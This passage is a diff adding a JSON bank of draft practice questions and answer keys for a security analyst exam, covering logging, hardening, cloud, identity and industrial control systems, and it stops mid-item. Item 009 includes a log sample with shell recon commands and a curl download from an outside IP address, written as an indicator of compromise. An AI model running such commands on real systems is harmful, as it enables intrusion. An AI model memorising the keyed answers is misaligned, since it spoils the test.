@@ -1,0 +1,2070 @@
+[
+  {
+    "id": "cs4-1-1-mcq-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "A SIEM receives syslog from many servers, but analysts cannot filter by source address because each source formats its lines differently. Which processing step at the collector turns the raw lines into consistent, named fields?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Compression of incoming log batches"
+        },
+        {
+          "id": "b",
+          "text": "Parsing and normalization at ingestion"
+        },
+        {
+          "id": "c",
+          "text": "Rotation of the oldest log files"
+        },
+        {
+          "id": "d",
+          "text": "Encryption of the channel used for forwarding"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Parsing splits each raw line into fields and normalization gives the same field the same name across sources, which makes cross-source searches work. Compression saves space, rotation manages file size, and channel encryption protects data in transit, but none of them creates searchable fields.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-002",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "A Linux file server records only failed logins. The team wants to learn which account modified files under `/etc/app/`. Which logging configuration change supports this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Forward only failed logins to the SIEM"
+        },
+        {
+          "id": "b",
+          "text": "Raise the verbosity of boot messages"
+        },
+        {
+          "id": "c",
+          "text": "Audit writes and changes on that path"
+        },
+        {
+          "id": "d",
+          "text": "Shorten the log rotation interval"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "File-level audit rules that record writes and attribute changes name the account behind each modification. Forwarding failed logins adds nothing about file changes, boot messages describe startup, and a shorter rotation interval only changes how files are split.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-003",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "Legal counsel asks whether archived authentication records could have been edited by an administrator of the log server. Which design best supports showing that they were not?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Compress the archive with a stronger algorithm"
+        },
+        {
+          "id": "b",
+          "text": "Rename each file with its collection date"
+        },
+        {
+          "id": "c",
+          "text": "Mirror the archive to a second disk on the same server"
+        },
+        {
+          "id": "d",
+          "text": "Send copies to a separate collector and keep signed hashes there"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Copies held away from the original administrators, with signed hashes that expose any later change, give evidence of integrity. Compression and file names do not detect edits, and a mirror on the same server is still under the same administrator's control.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-004",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "An analyst correlates two hosts' events for one user session. The application should log the session within a second of the gateway allowing the connection, yet the entries are seven minutes apart.\n```\ngw01  Mar 04 11:02:10 allow tcp 10.1.4.20 -> 10.1.9.5:8443\napp07 Mar 04 11:09:14 session open src=10.1.4.20 user=jdoe\n```\nWhat is the most likely cause, and the fix?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Clock drift; sync every source to one time server"
+        },
+        {
+          "id": "b",
+          "text": "Duplicate events; turn on deduplication in the SIEM"
+        },
+        {
+          "id": "c",
+          "text": "Dropped packets; enlarge the collector's buffer size"
+        },
+        {
+          "id": "d",
+          "text": "Delayed rotation; archive the files more often"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Events that should be close together but carry timestamps minutes apart point to unsynchronized clocks, so every source should use the same time server. Duplicates would repeat entries rather than shift them, buffer size affects loss rather than timestamps, and rotation does not alter the time written on an event.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-005",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "Policy requires 12 months of authentication records, but fast search storage is limited. Which approach meets the policy at reasonable cost?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Delete anything older than 90 days"
+        },
+        {
+          "id": "b",
+          "text": "Keep only the failed attempts for 12 months"
+        },
+        {
+          "id": "c",
+          "text": "Store only a daily event count"
+        },
+        {
+          "id": "d",
+          "text": "Keep 90 days searchable, then archive the rest on cheaper storage"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Tiered retention keeps recent data fast to search and holds older data on cheaper storage for the full period. Deleting at 90 days breaks the policy, and keeping only failures or a daily count discards the detail an investigation would need.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-006",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A legacy network appliance cannot run any collection software but can push event messages to a remote address. Which ingestion method fits?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Agentless collection by a syslog listener"
+        },
+        {
+          "id": "b",
+          "text": "Install a collection agent on the appliance"
+        },
+        {
+          "id": "c",
+          "text": "Export its log file by hand each week"
+        },
+        {
+          "id": "d",
+          "text": "Poll its display with a screen scraper"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Agentless collection lets a listener receive messages the device already sends, so nothing has to run on it. An agent cannot be installed on this appliance, and weekly manual exports or screen scraping are slow, fragile and incomplete.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-007",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A vulnerability scan of a new web server finds telnet and an unused file-sharing daemon listening. Which hardening step addresses this finding?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Disable unneeded services and close their ports"
+        },
+        {
+          "id": "b",
+          "text": "Add a second administrator account for backup"
+        },
+        {
+          "id": "c",
+          "text": "Increase the verbosity of application logs on the server"
+        },
+        {
+          "id": "d",
+          "text": "Move the server to a larger virtual machine"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Hardening reduces the attack surface, and every service that is not needed is removed or disabled. An extra administrator account enlarges the surface, more verbose logs only describe activity, and a larger virtual machine leaves the same listeners in place.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-008",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "On a Linux host, an analyst suspects someone created a new local account for persistence. Which file should be checked first for the list of local accounts?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`/etc/hosts`"
+        },
+        {
+          "id": "b",
+          "text": "`/etc/passwd`"
+        },
+        {
+          "id": "c",
+          "text": "`/etc/fstab`"
+        },
+        {
+          "id": "d",
+          "text": "`/var/log/wtmp`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "`/etc/passwd` has one line for each local account, so a new entry stands out. `/etc/hosts` maps names to addresses, `/etc/fstab` lists file systems to mount, and `/var/log/wtmp` records past logins rather than the accounts that exist.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-009",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "An analyst reviews this process tree on a public web server.\n```\nPPID  PID   USER      COMMAND\n1     640   root      /usr/sbin/nginx -g daemon off\n640   655   www-data  nginx: worker process\n655   2210  www-data  /bin/sh -c id; uname -a\n2210  2231  www-data  curl -s http://198.51.100.7/a\n```\nWhich observation is the most concerning?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The master process runs as the superuser"
+        },
+        {
+          "id": "b",
+          "text": "The worker processes run under an unprivileged account"
+        },
+        {
+          "id": "c",
+          "text": "A worker has launched a shell that runs recon and download commands"
+        },
+        {
+          "id": "d",
+          "text": "The web server is a child of the init process"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A web server worker that spawns a shell, runs system-information commands and fetches a file from an outside address is a classic sign of command execution through the web application. A master process that starts as the superuser, workers that drop to an unprivileged account and a parent of init are all normal for this server.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-010",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A team rebuilds an application as small stateless services that scale independently and are deployed through automated pipelines. Which term describes this design?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Lift-and-shift migration"
+        },
+        {
+          "id": "b",
+          "text": "Monolithic hosting"
+        },
+        {
+          "id": "c",
+          "text": "Colocation"
+        },
+        {
+          "id": "d",
+          "text": "Cloud-native design"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Cloud-native design builds applications from small, independently scalable services that are delivered and managed through automation. Lift-and-shift moves an unchanged workload, monolithic hosting keeps one large unit, and colocation only rents rack space.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-011",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "A host runs 20 virtual machines for different departments on shared hardware. Which risk is specific to this arrangement?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A guest escaping isolation to reach the hypervisor"
+        },
+        {
+          "id": "b",
+          "text": "Weak passwords reused on several staff accounts"
+        },
+        {
+          "id": "c",
+          "text": "Phishing messages reaching staff inboxes"
+        },
+        {
+          "id": "d",
+          "text": "Stolen credentials replayed against a remote portal"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Guest escape is a virtualization risk: a flaw can let one compromised VM break isolation and reach the layer that controls all the others. Password reuse, phishing and credential replay can happen in any environment and are not tied to hosting virtual machines.",
+    "acronyms": [
+      "VM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-012",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "Several containers run on one machine. Which component do they all share, so that a flaw in it affects every container?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A separate guest operating system for each"
+        },
+        {
+          "id": "b",
+          "text": "The underlying operating system kernel"
+        },
+        {
+          "id": "c",
+          "text": "The container's own writable layer"
+        },
+        {
+          "id": "d",
+          "text": "A dedicated hypervisor for every container"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Containers share the kernel of the operating system beneath them, so a kernel flaw is a concern for all of them. Guest operating systems and per-container hypervisors belong to virtualization, and the writable layer is private to each container.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-013",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "An analyst reviews gateway entries for one API client token.\n```\nGET /v1/invoices/1041 200 token=t-77a\nGET /v1/invoices/1042 200 token=t-77a\nGET /v1/invoices/1043 200 token=t-77a\nGET /v1/invoices/1044 200 token=t-77a\n```\nThe token belongs to customer 5, and invoices 1041 to 1044 belong to other customers. Which weakness does this indicate?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Verbose error messages exposing internals"
+        },
+        {
+          "id": "b",
+          "text": "An expired server certificate"
+        },
+        {
+          "id": "c",
+          "text": "Broken object-level authorization"
+        },
+        {
+          "id": "d",
+          "text": "Injection through the query string"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "The API returns objects that the token's owner should not be able to read, which is broken object-level authorization. Error messages, certificates and injection are different weaknesses, and the log shows successful responses with no errors or malformed input.",
+    "acronyms": [
+      "API"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-014",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Employees read work email on personal phones that the company manages with MDM. An employee resigns. Which action removes company data without deleting the person's photos?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Perform a full factory reset of the phone"
+        },
+        {
+          "id": "b",
+          "text": "Disable the phone's camera remotely"
+        },
+        {
+          "id": "c",
+          "text": "Change the employee's directory password"
+        },
+        {
+          "id": "d",
+          "text": "Selectively wipe the managed container"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A selective wipe deletes only the managed work container and its data and leaves personal content alone. A factory reset erases the photos too, disabling the camera removes nothing, and a password change leaves the stored company data on the phone.",
+    "acronyms": [
+      "MDM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-015",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "An EDR console shows that a laptop has disk encryption off and its host firewall disabled, though both are required. Which concept compares each endpoint with an approved configuration and flags the gap?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Posture assessment"
+        },
+        {
+          "id": "b",
+          "text": "Full packet capture of traffic"
+        },
+        {
+          "id": "c",
+          "text": "Log rotation on the laptop"
+        },
+        {
+          "id": "d",
+          "text": "Certificate pinning for client apps"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Posture assessment checks an endpoint's settings against a required baseline and reports any drift. Packet capture records traffic, log rotation manages log files, and certificate pinning ties a client to a known certificate.",
+    "acronyms": [
+      "EDR"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-016",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Which statement best describes how ZTNA decides whether to allow a connection?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "It trusts any device on an office network address"
+        },
+        {
+          "id": "b",
+          "text": "It grants access to the whole subnet after a single successful login"
+        },
+        {
+          "id": "c",
+          "text": "It checks identity, device state and context on each request"
+        },
+        {
+          "id": "d",
+          "text": "It relies on the perimeter firewall to block everything from outside"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Zero trust network access evaluates who is asking, the state of the device and the context for every request, and grants access to the specific application. Trusting network location, granting subnet-wide access after one login and depending on a perimeter all assume the inside is safe, which zero trust rejects.",
+    "acronyms": [
+      "ZTNA"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-017",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A company with many remote offices wants a secure web gateway, a CASB and ZTNA delivered from the cloud and managed as one service. Which architecture is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Unified threat management appliance"
+        },
+        {
+          "id": "b",
+          "text": "SASE"
+        },
+        {
+          "id": "c",
+          "text": "Software-defined networking"
+        },
+        {
+          "id": "d",
+          "text": "A virtual local area network"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "SASE converges wide-area networking with cloud-delivered security functions such as a gateway, a CASB and ZTNA. A UTM is a consolidated on-premises appliance, SDN separates the control plane from forwarding, and a VLAN only segments a local network.",
+    "acronyms": [
+      "CASB",
+      "SASE",
+      "SDN",
+      "UTM",
+      "VLAN",
+      "ZTNA"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-018",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "A hospital keeps patient records in an on-premises data center and runs analytics in a public cloud over a private link. Which design step gives analysts one view of activity across both?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Turn off cloud logging to cut storage cost"
+        },
+        {
+          "id": "b",
+          "text": "Give each environment its own console and its own analyst team"
+        },
+        {
+          "id": "c",
+          "text": "Rely on the cloud provider's built-in dashboard for the whole estate"
+        },
+        {
+          "id": "d",
+          "text": "Forward logs from both sides to a single SIEM with synchronized clocks"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Hybrid environments need logs from both sides in one place with consistent timestamps so events can be correlated. Turning off logging, splitting the teams and relying on one provider's view each leave a blind spot.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-019",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "Three administrators share one domain admin password kept in a spreadsheet, so nobody can say who did what. Which PAM capability fixes both the sharing and the missing accountability?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Vaulted per-person credential checkout, with recording"
+        },
+        {
+          "id": "b",
+          "text": "A longer shared password that is rotated each quarter"
+        },
+        {
+          "id": "c",
+          "text": "A second copy of the spreadsheet kept on another server"
+        },
+        {
+          "id": "d",
+          "text": "Removing the MFA prompt so administrators sign in faster"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A PAM vault issues privileged access to a named person for each use and records the session, so actions are attributable. A longer shared password is still shared, another copy of the spreadsheet spreads the secret, and removing MFA weakens the account.",
+    "acronyms": [
+      "MFA",
+      "PAM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-020",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A user signs in with a password and a one-time code, then is refused when opening a payroll folder. Which step produced the refusal?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Authentication of the user"
+        },
+        {
+          "id": "b",
+          "text": "Accounting of the session"
+        },
+        {
+          "id": "c",
+          "text": "Authorization"
+        },
+        {
+          "id": "d",
+          "text": "Identification of the user"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Authorization decides what an already verified user may access, so the refusal came from it. Authentication verified the password and code, accounting records activity, and identification only claims who the user is.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-021",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Which pair of checks counts as MFA?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A password and a security question"
+        },
+        {
+          "id": "b",
+          "text": "A password and a hardware token code"
+        },
+        {
+          "id": "c",
+          "text": "A fingerprint scan and a facial recognition scan"
+        },
+        {
+          "id": "d",
+          "text": "A passphrase and a short passcode"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "MFA combines different factor types, here something known and something possessed. A security question and a second secret are both knowledge, and fingerprint plus face are both inherence, so each pair stays within one factor type.",
+    "acronyms": [
+      "MFA"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-022",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "A scan finds this line committed to a code repository, and the value is a live production password.\n```\ndb_password = \"Winter#4417\"\n```\nWhich response is best?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Encode the value with Base64 before committing it"
+        },
+        {
+          "id": "b",
+          "text": "Set the repository to private and keep the current password"
+        },
+        {
+          "id": "c",
+          "text": "Rotate the password, then load it from a secrets manager at runtime"
+        },
+        {
+          "id": "d",
+          "text": "Add a code comment asking developers to keep it confidential"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "An exposed secret must be treated as compromised, so it is rotated and then supplied at runtime from a secrets manager instead of from code. Base64 is reversible encoding, a private repository still leaves the password in history, and a comment gives no protection.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-023",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Customer files travel from a branch office to a cloud store and then stay there. Which pair of protections covers both states?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "TLS in transit and encryption at rest"
+        },
+        {
+          "id": "b",
+          "text": "Hashing in transit and TLS at rest"
+        },
+        {
+          "id": "c",
+          "text": "Encoding in transit and hashing at rest"
+        },
+        {
+          "id": "d",
+          "text": "Compression in transit and signing at rest"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Encryption in transit, such as TLS, protects data on the wire, and encryption at rest protects it where it is stored. Hashing and signing give integrity rather than confidentiality, and encoding and compression are not security controls.",
+    "acronyms": [
+      "TLS"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-024",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "A test team needs realistic customer records but must not see real PII. Which technique substitutes realistic fake values for the real ones?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Data classification"
+        },
+        {
+          "id": "b",
+          "text": "Data deduplication"
+        },
+        {
+          "id": "c",
+          "text": "Data masking"
+        },
+        {
+          "id": "d",
+          "text": "Data archiving"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Masking replaces sensitive values with realistic but fictitious ones so the data remains usable for testing. Classification labels sensitivity, deduplication removes copies and archiving moves old data to long-term storage.",
+    "acronyms": [
+      "PII"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-025",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "A water utility's pumps, valves and sensors are monitored and controlled by dedicated hardware and software. Which term covers this technology?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Information technology"
+        },
+        {
+          "id": "b",
+          "text": "Operational technology"
+        },
+        {
+          "id": "c",
+          "text": "Cloud technology"
+        },
+        {
+          "id": "d",
+          "text": "Mobile device technology"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Operational technology monitors and controls physical processes and equipment. Information technology handles data and business systems, and cloud-native and mobile technologies describe delivery models and devices rather than process control.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-026",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "A utility's control center gathers readings from remote substations over long distances and sends commands back to field controllers. Which system is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A single-machine HMI panel"
+        },
+        {
+          "id": "b",
+          "text": "A SCADA system"
+        },
+        {
+          "id": "c",
+          "text": "A SIEM log collector"
+        },
+        {
+          "id": "d",
+          "text": "An MDM enrollment server"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "SCADA supervises geographically spread sites by collecting data and issuing commands to field devices. An HMI is a local operator display, a SIEM collects security logs and an MDM server manages mobile devices.",
+    "acronyms": [
+      "HMI",
+      "MDM",
+      "SCADA",
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-027",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-single",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "In an ICS, which role does a PLC play?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "It archives years of process readings for later reporting"
+        },
+        {
+          "id": "b",
+          "text": "It displays live process status on screens for the operators"
+        },
+        {
+          "id": "c",
+          "text": "It forwards security events from the plant to the SIEM"
+        },
+        {
+          "id": "d",
+          "text": "It runs control logic reading sensors and driving actuators"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A programmable logic controller executes control logic, reading inputs from sensors and driving outputs to actuators. Archiving readings is a historian's job, showing status to operators is an HMI's job, and forwarding security events is done by a collector.",
+    "acronyms": [
+      "HMI",
+      "ICS",
+      "PLC",
+      "SIEM"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-028",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "stem": "Which TWO factors should most influence how long a company retains its security logs?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Legal and regulatory retention requirements"
+        },
+        {
+          "id": "b",
+          "text": "The default rotation period set by the log source's vendor"
+        },
+        {
+          "id": "c",
+          "text": "How far back investigations usually need to look"
+        },
+        {
+          "id": "d",
+          "text": "The number of dashboards the SOC maintains"
+        },
+        {
+          "id": "e",
+          "text": "The storage brand used by the log server"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "c"
+      ]
+    },
+    "explanation": "Retention should follow what the law and policy require and how far back responders need to look. A vendor's default rotation, the number of dashboards and the storage brand have no bearing on how long records are needed.",
+    "acronyms": [
+      "SOC"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-029",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Which THREE actions are system hardening steps for a new database server?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Install a second web browser for troubleshooting"
+        },
+        {
+          "id": "b",
+          "text": "Replace default account passwords and remove unused accounts"
+        },
+        {
+          "id": "c",
+          "text": "Give developers local administrator rights for convenience"
+        },
+        {
+          "id": "d",
+          "text": "Disable unused services and close unneeded ports"
+        },
+        {
+          "id": "e",
+          "text": "Apply a configuration baseline and current security patches"
+        },
+        {
+          "id": "f",
+          "text": "Enable guest access to ease file sharing"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d",
+        "e"
+      ]
+    },
+    "explanation": "Hardening removes default credentials and unused accounts, shuts off unneeded services and ports, and brings the system to a secure baseline with current patches. Extra software, broad administrator rights and guest access all widen the attack surface.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-030",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "Which TWO practices reduce risk when running containers in production?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Mount the host's container runtime socket into each container"
+        },
+        {
+          "id": "b",
+          "text": "Run the application as a non-root user inside the container"
+        },
+        {
+          "id": "c",
+          "text": "Use the latest tag so versions change silently at deploy time"
+        },
+        {
+          "id": "d",
+          "text": "Pull images only from a trusted registry after scanning them"
+        },
+        {
+          "id": "e",
+          "text": "Share one writable volume among all containers on the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "Running as a non-root user limits what a compromised process can do, and scanned images from a trusted registry limit what code gets in. Exposing the runtime socket hands over control of the host, floating tags make deployments unpredictable, and a shared writable volume lets one container tamper with another.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-031",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "Which TWO measures reduce risk from application secrets such as keys and tokens?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Embed the key in the container image so the image is self-contained"
+        },
+        {
+          "id": "b",
+          "text": "Email the token to the next on-call engineer"
+        },
+        {
+          "id": "c",
+          "text": "Keep secrets in a secrets manager and retrieve them at runtime"
+        },
+        {
+          "id": "d",
+          "text": "Use one shared key for every environment to reduce upkeep"
+        },
+        {
+          "id": "e",
+          "text": "Rotate secrets on a schedule and after any suspected exposure"
+        }
+      ]
+    },
+    "answer": {
